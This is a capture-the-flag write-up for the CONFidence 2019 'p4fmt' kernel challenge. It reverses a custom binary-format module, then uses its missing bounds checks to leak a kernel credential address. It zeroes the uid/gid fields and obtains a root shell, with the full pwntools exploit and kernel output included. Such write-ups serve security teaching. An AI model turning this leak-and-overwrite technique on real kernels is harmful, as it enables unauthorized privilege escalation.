# CONFidence CTF 2019 Teaser
## p4fmt
#### Flag: p4{4r3_y0U_4_81n4ry_N1njA?}
### The challenge
![](https://i.imgur.com/NmShaRg.png)
* The files
```
.
├── bzImage
├── initramfs.cpio.gz
└── run.sh
```
* run<span></span>.sh:
```sh
#!/bin/bash
qemu-system-x86_64 -kernel ./bzImage \
		-initrd ./initramfs.cpio.gz \
		-nographic \
		-append "console=ttyS0" \
```
Extract the content of rootfs:
```shell
gunzip initramfs.cpio.gz && cpio -idmv < initramfs.cpio
```
rootfs:
```
...
├── bzImage
├── dev
├── etc
│   └── passwd
├── flag
├── home
│   └── pwn
├── init
├── p4fmt.ko
├── proc
├── run.sh
├── sbin
├── sys
├── tmp
└── usr
    ├── bin
    └── sbin

12 directories, 399 files
```
The `flag` and `p4fmt.ko` kernel module are at the root directory.
```sh
/ $ ls -l flag
-rw-------    1 root     0               28 Mar 15 21:38 flag
```
Only root can read the flag, therefore our the goal is privilege escalation obviously.
### p4fmt.ko
It's a simple kernel module:
```c
__int64 load_p4_binary(linux_binprm *_bprm){
  ...
}
__int64 p4fmt_init()
{
  _register_binfmt(&p4format, 1LL);
  return 0LL;
}

__int64 p4fmt_exit()
{
  return unregister_binfmt(&p4format);
}
```
It register a new binary format for p4 binary, and `load_p4_binary` is similar with `load_elf_binary` but for p4 format.

### load_p4_binary
It first check whether the binary file is start with `"P4"`, if not it will return `-ENOEXEC`.
After some reversing on the function, we can simply figure out the file format of p4 binary:
```c
struct p4fmt{
    char magic[2] = "P4",
    int8_t version,
    int8_t arg,
    int32_t load_count,
    int64_t header_offset, // offset to loads
    int64_t entry,
    char _gap[header_offset - 0x18],
    struct load loads[load_count]
}

struct load{
    int64_t addr,
    int64_t length,
    int64_t offset
};
```
Version should be 0, otherwise it will `printk("Unknown version")`. There are two loading method determined by `arg`. If arg be 1, it will load the `address, length, offset` from header and do `vm_mmap`.
We can generate a simple Hello World p4 binary:
```python
binary = 'P4'               # MAGIC
binary += p8(0)             # version
binary += p8(1)             # arg
binary += p32(1)            # load_count
binary += p64( 0x18 )       # header_offset
binary += p64( 0x400080 )   # entry
binary += p64( 0x400000 | 7 ) + p64( 0x1000 ) + p64( 0 ) # addr , length , offset
binary = binary.ljust( 0x80 , '\0' ) # 128
binary += asm(
    shellcraft.echo( 'Hello World!' ) +
    shellcraft.exit(0)
)
```
Result:
```python
/tmp $ ./hello_word
[   22.679510] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
Hello World!
/tmp $
```
### Vulnerability
First I thought whether can do something with `vm_mmap`, because there was no checking for the arguments, but there were `MAP_PRIVATE` and `ADDR_LIMIT_32BIT` flags, so it seemed like nothing to do.

After then, take a look at `struct linux_binprm`:
```C
struct linux_binprm {
	char buf[BINPRM_BUF_SIZE];
	struct vm_area_struct *vma;
	unsigned long vma_pages;
	struct mm_struct *mm;
	unsigned long p; /* current top of mem */
	unsigned long argmin; /* rlimit marker for copy_strings() */
	unsigned int called_set_creds:1, cap_elevated:1, secureexec:1;
	unsigned int recursion_depth; /* only for search_binary_handler() */
	struct file * file;
	struct cred *cred;	/* new credentials */
	int unsafe;		/* how unsafe this exec is (mask of LSM_UNSAFE_*) */
	unsigned int per_clear;	/* bits to clear in current->personality */
	int argc, envc;
	const char * filename;	/* Name of binary as seen by procps */
	const char * interp;	
	unsigned interp_flags;
	unsigned interp_data;
	unsigned long loader, exec;
	struct rlimit rlim_stack; /* Saved RLIMIT_STACK used during exec. */
};
```
Binary header will be stored to `bprm->buf[]`, and the part of `load_p4_binary` where it process memory loading:
```c
if ( (p4fmt *)(bprm->buf).arg > 1u )
  return (unsigned int)-EINVAL;
retval = flush_old_exec(bprm, P4MAG);
if ( !retval )
{
  current->personality = 0x800000;
  setup_new_exec(bprm);
  arg = (p4fmt *)(bprm->buf).arg;
  if ( arg )
  {
    if ( arg != 1 )
      return (unsigned int)-EINVAL;
      if ( (p4fmt *)(bprm->buf).load_count )
      {
        loads = (load *)&buf->magic[ (p4fmt *)(bprm->buf).header_offset ];
        do
        {
          addr = loads->addr;
          prot = loads->addr & 7LL;
          base = loads->addr & 0xFFFFFFFFFFFFF000LL;
          printk("vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n", base, loads->length, loads->offset, prot);
          offset = loads->offset;
          length = loads->length;
          if ( addr & 8 )
          {
            vm_mmap(0LL, base, length, prot, 2LL, offset);
            printk("clear_user(addr=0x%llx, length=0x%llx)\n", loads->addr, loads->length);
            _clear_user(loads->addr, loads->length);
          }
          else
          {
            vm_mmap(bprm->file, base, length, prot, 2LL, offset);
          }
          ++retval;
          ++loads;
      }while ( bprm->buf.load_count > retval );
    }
  }
  else{

.....
```
The problem is that it does not has bounds checking for `header_offset` and `load_count`, we can use `header_offset` to control the pointer:
`loads = (load *)&buf->magic[ (p4fmt *)(bprm->buf).header_offset ];`,
and over reading memory by setting up `load_count`,  therefore we can leak the content in `struct linux_binprm`.

PoC:
```python
binary = 'P4'                # MAGIC
binary += p8(0)              # version
binary += p8(1)              # arg
binary += p32( 5 )           # load_count
binary += p64( 0x80 - 0x18 ) # header_offset

Result:
/tmp $ ./leak
[    7.607129] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)
[    7.607460] vm_mmap(load_addr=0x7fffffffe000, length=0x100000001, offset=0x0, prot=3)
[    7.607952] vm_mmap(load_addr=0xffff9f160213d000, length=0x0, offset=0x7fffffffeff1, prot=0)
[    7.608132] vm_mmap(load_addr=0x0, length=0xffff9f16020c8b40, offset=0x800000, prot=0)
[    7.608315] vm_mmap(load_addr=0xfffffffffffff000, length=0x1, offset=0x0, prot=7)
[    7.608561] clear_user(addr=0xffffffffffffffff, length=0x1)
[    7.610219] leak[526]: segfault at 0 ip 0000000000000000 sp 00007fffffffef93 error 14
[    7.610786] Code: Bad RIP value.
Segmentation fault
/tmp $
```
### Privilege escalation
For now, we can use kernel information leak to bypass kaslr, but how to achieve privilege escalation.
We can simplify the process of `load_p4_binary`:
1. Check for file format.
2. `flush_old_exec(bprm, P4MAG)`
3. `setup_new_exec(bprm)`
4. Process memory loading.
5. `install_exec_creds(bprm)`
6. `set_binfmt(&p4format)`
7. `setup_arg_pages(bprm, randomize_stack_top(STACK_TOP), 0LL)`
8. `finalize_exec(bprm)`
9. `start_thread(regs, p4_entry, bprm->p)`

`install_exec_creds(bprm)` is interesting, it will do `commit_creds(bprm->cred);` inside.
```c
void install_exec_creds(struct linux_binprm *bprm)
{
	security_bprm_committing_creds(bprm);

	commit_creds(bprm->cred);
	bprm->cred = NULL;

	if (get_dumpable(current->mm) != SUID_DUMP_USER)
		perf_event_exit_task(current);

	security_bprm_committed_creds(bprm);
	mutex_unlock(&current->signal->cred_guard_mutex);
}
```
We are already able to leak the address of `struct cred *cred` in `struct linux_binprm *bprm`, and the `struct cred`:
```c
struct cred {
	atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
    ...
```
If we can overwrite the `uid` and `gid` in `bprm->cred` before `install_exec_creds`, so that it would install the new `cred`!

But how to set the `uid` and `gid` to zero, remember there is `_clear_user()`:
```
Name
clear_user — Zero a block of memory in user space.

Synopsis
unsigned long clear_user (void __user * to, unsigned long n);
```
And `_clear_user(loads->addr, loads->length);` in `load_p4_binary`, where `loads->add` and `loads->length` are controllable, that means we can zero a block of memory everywhere. That's AWOSEOME!
### Constraints
Although we are able to leak the memory, but we can't do the leak and setting up header at the same time with the same binary.
Execute another time, the address of `cred` has some random offset, but I found the interesting thing:
```
[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0

[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0
```
The address will be the same when execute binary every  five times, don't know the reason...

### Exploit
Generate a p4 binary for kernel memory leak first, then set up loads header of second p4 binary to trigger `_clear_user( bprm->cred + 0x10 , len ); // +0x10 prevent crashing caused by the NULL pointer`.
`install_exec_creds(bprm)` will call `commit_creds(bprm->cred);` and process our new `bprm->cred`, then execute our p4 binary with root privilege!
Execute shellocde and enjoy the root shell :D

### Root shell
```
/tmp $ ./pwn
[   17.114933] vm_mmap(load_addr=0x7000000, length=0x1000, offset=0x0, prot=7)
[   17.115323] vm_mmap(load_addr=0xffffa11a421b5000, length=0x48, offset=0x0, prot=0)
[   17.115656] clear_user(addr=0xffffa11a421b5f18, length=0x48)
/tmp # id
uid=0(root) gid=0 groups=1000
/tmp # cat /flag
p4{4r3_y0U_4_81n4ry_N1njA?}
/tmp #
```

exploit:
```python
#!/usr/bin/env python
from pwn import *
import base64
import re

# p4{4r3_y0U_4_81n4ry_N1njA?}

context.arch = 'amd64'
host , port = 'p4fmt.zajebistyc.tf' , 30002
y = remote( host , port )

def gen_p4_binary( version = 0 , arg = 1 , section_header_offset = 0x18 , sections_len = 0 , entry = 0 , sections = [] , code = '' ):
    b = 'P4' # MAGIC
    b += p8( version ) + p8( arg ) + p32( sections_len ) + p64( section_header_offset ) + p64( entry )
    b += ''.join( flat(s) for s in sections )
    if code:
        b = b.ljust( entry & 0xfff , '\0' )
        b += code
    return b

def sp( cmd ):
    y.sendlineafter( '$' , cmd )

def leak():
    sp( './leak' )
    y.recvuntil( 'length=' )
    cred = int( y.recvuntil( ',' )[:-1] , 16 )
    success( 'cred -> %s' % hex( cred ) )
    return cred

sp( 'cd /tmp' )

p4 = gen_p4_binary( section_header_offset = 0x90 , sections_len = 1 )
sp( "echo %s | base64 -d > ./leak" % ( base64.b64encode( p4 ) ) )
sp( 'chmod +x ./leak' )
cred = leak() # 1

print shellcraft.echo('Hellofewfew')

p4 = gen_p4_binary( sections = [[0x7000000 | 7, 0x1000, 0], [cred | 8 + 0x10, 0x48, 0]] , sections_len = 2  , entry = 0x7000090 , code = asm( shellcraft.echo('Hellofewfew\n') + shellcraft.exit(0) ) )
sp( 'printf \'\\%s\' > ./pwn' % '\\'.join( oct( ord( _ ) )[1:].rjust( 3 ,'0' ) for _ in p4 ) )
sp( 'chmod +x ./pwn' )

'''
[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0

[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0
'''

for _ in range(3):
    leak()

sp( './pwn' ) # cred should be the same as first leak

y.sendlineafter( '/tmp #' , 'id && cat /flag' ) # root !

y.interactive()
```